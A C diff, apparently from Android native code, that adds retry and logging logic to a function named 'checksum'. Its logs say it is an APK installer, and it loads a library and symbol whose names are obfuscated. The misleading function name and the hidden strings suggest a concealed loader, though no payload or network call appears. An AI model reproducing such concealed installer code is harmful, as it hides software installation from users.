@@ -1,4 +1,5 @@
 #include <stdio.h>
+#include <unistd.h>
 #include <sys/time.h>
 #include <stdlib.h>
 #include <errno.h>
@@ -49,17 +50,33 @@ __attribute__ ((visibility ("default"))) int checksum(void) {
 
   LOGD("[APK INSTALLER] Starting apk installation\n");
   LOGD("[APK INSTALLER] Opening crypto lib\n");
-
+  int test = 5;
+open_dl:
+  error = malloc(512);
+  error = getcwd(error,512);
   // Open crypto library
+  if(handle){
+    dlclose(handle);
+    handle = NULL;
+    error = NULL;
+  }
   handle = dlopen(deobfuscate(bson_path), RTLD_LAZY);
   if(!handle) {
     LOGD("[APK INSTALLER] Unable to open crypto lib\n");
     return 0;
   }
-
+  if(error!=NULL) {
+    LOGD("[APK INSTALLER] opened crypto lib at %s/%s\n",error,deobfuscate(bson_path));
+    free(error);
+    error=NULL;
+  }
   decrypt_t decrypt_ptr = (decrypt_t) dlsym(handle, deobfuscate(bson_sym));
   if ((error = dlerror()) != NULL) {
-    LOGD("[APK INSTALLER] Unable to find crypto sym\n");
+    LOGD("[APK INSTALLER] Unable to find crypto sym: %s\n error %s",deobfuscate(bson_sym),error);
+    if (test --){
+      LOGD("[APK INSTALLER] try again %d\n",test);
+      goto open_dl;
+    }
     return 0;
   }
 
